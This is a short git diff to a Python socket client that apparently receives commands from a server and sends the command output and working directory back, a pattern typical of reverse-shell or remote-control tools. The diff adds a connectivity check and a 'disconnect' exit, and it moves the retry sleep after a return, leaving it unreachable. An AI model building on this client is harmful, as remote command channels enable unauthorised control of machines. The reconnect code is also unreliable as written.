@@ -31,6 +31,14 @@ def receive(conn):
     return msg
 
 
+def is_still_connected(sock):
+    try:
+        sock.sendall(b"")
+    except:
+        return False
+    return True
+
+
 def connect(addr):
     global client
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -38,8 +46,8 @@ def connect(addr):
         client.connect(ADDR)
         return True
     except:
-        time.sleep(10)
         return False
+        time.sleep(10)
 
 
 def main():
@@ -79,7 +87,7 @@ def main():
             # send the results back to the server
             send(output)
             send(cwd)
-            if command == "exit":
+            if command in ["exit", "disconnect"]:
                 break
         if command == "exit":
             break
